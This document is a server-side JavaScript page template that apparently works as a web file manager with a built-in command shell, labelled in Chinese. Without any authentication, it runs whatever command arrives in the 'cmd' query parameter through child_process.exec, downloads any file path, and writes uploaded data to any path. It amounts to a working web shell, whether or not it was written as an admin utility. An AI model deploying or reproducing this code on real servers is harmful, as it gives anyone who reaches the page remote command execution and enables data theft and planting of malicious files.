<?js
const fs=require('fs')
const path=require('path')
const {task='ls', fdir=INIT_DIR}=query

function paths2fdir(paths) {
  return encodeURIComponent(paths.join(path.sep)||'/')
}
function ext(fname) {
  return (fname.replace(/^.*\.([^\.]+$)|^.*$/g, '$1')||'unknown').toUpperCase()
}
function md5(str) {
  return require('crypto').createHash('md5').update(str).digest('hex')
}
function size(m) {
  const l=['b','k','m','g']
  while(m>=1024 && l.length>1) {
    m/=1024
    l.shift()
  }
  return m.toFixed(1)+l[0]
}

if(task==='dl') {
  header('Content-Type', 'application/octet-stream')
  header('Content-Disposition', 'attachment;filename='+encodeURIComponent(path.parse(fdir).base))
  writefile(fdir)
}

if(task==='shell') {
  header('Content-Type', 'text/json')
  echo(await new Promise(r=>{
    const cp=require('child_process')
    cp.exec(query.cmd, {cwd: fdir}, (e, stdout, stderr)=>{
      r(JSON.stringify({stdout, stderr}))
    })
  }))
  return
}

if(task==='upfile') {
  header('Content-Type', 'text/json')
  echo(await new Promise(r=>{
    fs.writeFile(fdir+'/'+query.fn, postbody, (e)=>{
      r(e?e.message:'Success')
    })
  }))
  return
}

if(task==='ls') {
?><meta charset='utf8' />
<style type="text/css">
.list{
  left:0;
  white-space: nowrap;
}
.dirn{
    background: #eee;
    position: fixed;
    left: 0;
    top: 0;
    right: 0;
    font-size: 21px;
    padding: 10px 26px;
    z-index: 10;
}
.ctls{
  position: fixed;
    right: 0;
    top: 50px;
    background: #eee;
    z-index: 22;
}
.ctls div{
  padding: 5px 10px;
    border-bottom: 1px solid #ccc;
    width: 100px;
    cursor: pointer;
}
.cmdarea{
    position: fixed;
    left: 0;
    background: #dcdcdc;
    padding: 5px 5px;
    z-index: 11;
    width: 100%;
    top: 50px;
    bottom: 0;
    overflow: auto;
}
.hidden{
  display: none;
}
.dirn.pos{
  visibility: hidden;
  position: relative;
}
.icon{
    font-size: 12px;
    color: #fff;
    text-align: center;
    width: 25px;
    height: 30px;
    overflow: hidden;
    display: inline-block;
    vertical-align: middle;
    line-height: 30px;
    transform: scale(.6);
    margin-right: 3px;
    border-radius: 9px 0 0 0;
}
[data-fdir]:hover,[data-dl]:hover{
  cursor: pointer;
  color: #3385ff;
  background: #efc01977;
}
.noaccess{
  color: #f33;
  font-size: 12px;
  margin: 10px 0;
}
.dir{
  color: #333;
  font-weight: bold;
  font-size: 17px;
}
.dir,.file{
  line-height: 2;
}
.data{
  font-size: 12px;
  display: inline-block;
  opacity: .8;
  margin: 0 10px;
}
[type=file]{
  display: none;
}
</style>
<script type="text/javascript">
document.onclick=function(e) {
  var k=function(v) { return e.target.getAttribute(v)}
  var fdir=k('data-fdir'), dl=k('data-dl')
  if(fdir) location='?fdir='+fdir
  else if(dl) location='?task=dl&fdir='+dl
}
function xhr(url, data, cb) {
  var x=new XMLHttpRequest
  x.open(data?'POST':'GET', url,1)
  x.onreadystatechange=function(){
    if(x.readyState^4) return;
    cb(x.responseText)
  }
  x.send(data)
}
function sendcmd() {
  if(!cmd.value) return
  xhr('/?fdir=<?js echo(encodeURIComponent(fdir)) ?>&task=shell&cmd='+cmd.value, '', function(res) {
    var a=JSON.parse(res)
    stdout1.innerHTML=a.stdout||'<i>empty</i>'
    stderr1.innerHTML=a.stderr||'<i>empty</i>'
  })
}
function settype(n) {
  localStorage.setItem('settype', n)
  location.reload()
}
function upfile() {
  var n=new FileReader
  var f0=upf.files[0]
  n.readAsBinaryString(f0)
  n.onload=function(){
    xhr('/?fdir=<?js echo(encodeURIComponent(fdir)) ?>&task=upfile&fn='+encodeURIComponent(f0.name), n.result, function(res) {
      alert(res)
      location.reload()
    })
  }
}
</script><?js
}

if(task==='ls') {

  echo(`<div class="ctls">
    <div onclick="settype(0)">文件列表</div>
    <div onclick="settype(1)">shell</div>
    <div onclick="upf.click()">上传文件<input onchange="upfile()" type="file" id="upf" /></div>
  </div>`)

  const paths=path.resolve(fdir).split(path.sep)
  for(let g=0; g<2; g++) {
  echo('<div class="dirn '+(g?'':'pos')+'">')
  echo(paths.map((r, i)=>{
    return `<span data-fdir="${paths2fdir(paths.slice(0, i+1))}">${r}</span>`
  }).concat([
    `<span data-fdir="${paths2fdir(paths.slice(0, paths.length-1))}">..</span>`
  ]).join('/'))
  echo('</div>')
  }

  echo(`<div class="cmdarea" id='cmdarea'>
    <input id="cmd" /><button onclick="sendcmd()">shell</button>
    <div id="cmd_res">
      <div id="stdout">
        <b>stdout</b>
        <pre id='stdout1'></pre>
      </div>
      <div id="stderr">
        <b>stderr</b>
        <pre id='stderr1'></pre>
      </div>
    </div>
  </div>`)

  let fns=[]
  try{
    let dirs=[], files=[], noaccess=[]
    fs.readdirSync(fdir).map(a=>{
      const stat=fs.lstatSync(fdir+'/'+a)
      const isDir=stat.isDirectory()
      try{
        (isDir? dirs: files).push({fn: a, isDir, stat})
      }catch(e) {
        noaccess.push({fn: a, err: 1})
      }
    })
    fns=dirs.sort().concat(files.sort()).concat(noaccess.sort())
  }catch(e) {
    echo('<div class="noaccess">无权访问</div>')
  }
  echo('<ol class="list" id="list">')
  fns.map(({fn, isDir, stat, err})=>{
    let pfdir=paths2fdir(paths.concat(fn))
    if(err) echo(`<li class="dir" data-noaccess>${fn}</li>`)
    else if(isDir) echo(`<li class="dir" data-fdir="${pfdir}">${fn}</li>`)
    else echo(`<li class="file" data-dl="${pfdir}">
      <span class="icon" style="background-color: #${md5(ext(fn)).substr(0, 6)}">${ext(fn).substr(0, 2)}</span>${fn}
      <span class="data size">${size(stat.size)}</span>
    </li>`)
  })
  echo('</ol>')
}
?><script type="text/javascript">
if(!(localStorage.settype*1)) {
  cmdarea.className='cmdarea hidden'
  list.className='list'
}else{
  cmdarea.className='cmdarea'
  list.className='list hidden'
}
</script>